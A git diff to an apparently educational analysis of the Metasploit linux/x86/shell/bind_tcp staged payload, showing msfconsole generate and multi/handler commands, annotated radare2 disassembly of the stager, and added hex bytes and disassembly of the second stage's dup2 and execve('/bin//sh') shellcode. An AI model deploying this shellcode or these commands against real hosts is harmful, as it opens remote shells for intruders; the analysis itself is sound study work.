@@ -1,4 +1,4 @@
-# Metasploit linux/x86/shell/bind_tcp
+# Metasploit linux/x86/shell/bind_tcp (staged payload)
 
 ## Stager
 
@@ -7,12 +7,12 @@ Source: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/
 ### Generate
 ```
 msf5 > use payload/linux/x86/shell/bind_tcp
-msf5 payload(linux/x86/shell/bind_tcp) > generate -f raw -o stage1.bin
+msf5 payload(linux/x86/shell/bind_tcp) > generate -f raw -o stager.bin
 ```
 
 ### Disassembled Content
 ```
-$ r2 -a x86 -b 32 -c 'pd' stage1.bin
+$ r2 -a x86 -b 32 -c 'pd' stager.bin
             0x00000000      6a7d           push 0x7d           ; syscall #125: int mprotect(void *addr, size_t len, int prot);
             0x00000002      58             pop eax
             0x00000003      99             cdq                 ; edx = 0
@@ -76,10 +76,10 @@ $ r2 -a x86 -b 32 -c 'pd' stage1.bin
             0x00000061      b003           mov al, 3           ; syscall #3: ssize_t read(int fd, void *buf, size_t count);
             0x00000063      cd80           int 0x80        !!! ; read(sockfd, ecx, 3072)
 
-            0x00000065      87df           xchg edi, ebx       ; edi = [sockfd_], ebx = 0x00000000
-            0x00000067      5b             pop ebx             ; ebx = 0x00000000           00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
+            0x00000065      87df           xchg edi, ebx       ; edi = [sockfd_]
+            0x00000067      5b             pop ebx             ; ebx = [sockfd]             00000000|00000000|5c110002|00000010|ffffdff4<
             0x00000068      b006           mov al, 6           ; syscall #6: int close(int fd);
-            0x0000006a      cd80           int 0x80        !!! ; close(0)
+            0x0000006a      cd80           int 0x80        !!! ; close(sockfd)
 
             0x0000006c      ffe1           jmp ecx
             0x0000006e      ff             invalid
@@ -134,6 +134,53 @@ root@51d604030a59:/# apt install -y build-essential libc6-i386 gcc-multilib
 root@51d604030a59:/# gcc -m32 test.c -o test
 root@51d604030a59:/# setarch `uname -m` -R /shared/test
 ```
+
+## Payload
+The metasploit payload will be loaded using the following commands:
+```
+msf5 payload(linux/x86/shell/bind_tcp) > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload linux/x86/shell/bind_tcp
+msf5 exploit(multi/handler) > set rhost 127.0.0.1
+msf5 exploit(multi/handler) > set rport 4444
+msf5 exploit(multi/handler) > exploit
+```
+
+A network trace captures the following data:
+```
+00000000  89 fb 6a 02 59 6a 3f 58 cd 80 49 79 f8 6a 0b 58   ..j.Yj?X ..Iy.j.X
+00000010  99 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 53   .Rh//shh /bin..RS
+00000020  89 e1 cd 80                                       ....
+```
+
+```
+$ xxd -r payload.hex payload.bin
+$ r2 -a x86 -b 32 -c 'pd' payload.bin
+
+    0x00000000      89fb           mov ebx, edi                ; ebx = [sockfd_]
+    0x00000002      6a02           push 2                      ;                            00000002<
+    0x00000004      59             pop ecx                     ; ecx = STDERR_FILENO(2)     <
+┌─> 0x00000005      6a3f           push 0x3f                   ; 63                         00000063<
+╎   0x00000007      58             pop eax                     ; syscall #63: int dup2(int oldfd, int newfd);
+╎   0x00000008      cd80           int 0x80                    ; dup2(sockfd_, STDERR_FILENO)
+╎
+╎   0x0000000a      49             dec ecx                     ; ecx = 1, repeat for STDOUT_FILENO and STDIN_FILENO
+└─< 0x0000000b      79f8           jns 5                       ; ecx = 0
+
+    0x0000000d      6a0b           push 0xb                    ; 11                         0000000b<
+    0x0000000f      58             pop eax                     ; syscall #11: int execve(const char *pathname, char *const argv[], char *const envp[]);
+    0x00000010      99             cdq                         ; edx = 0
+    0x00000011      52             push edx                    ;                            00000000<
+    0x00000012      682f2f7368     push 0x68732f2f             ; '//sh'                     00000000|68732f2f<
+    0x00000017      682f62696e     push 0x6e69622f             ; '/bin'                     00000000|68732f2f|6e69622f<
+    0x0000001c      89e3           mov ebx, esp                ;
+    0x0000001e      52             push edx                    ;                            00000000|68732f2f|6e69622f|00000000<
+    0x0000001f      53             push ebx                    ;                            00000000|68732f2f|6e69622f|00000000|ffffdff4<
+    0x00000020      89e1           mov ecx, esp                ; ecx = 0xffffdff0
+    0x00000022      cd80           int 0x80                    ; execve("/bin//sh", {"/bin//sh"}, NULL)
+
+```
+
+
 
 ## References
  * [Linux syscall table](http://syscalls.kernelgrok.com/)
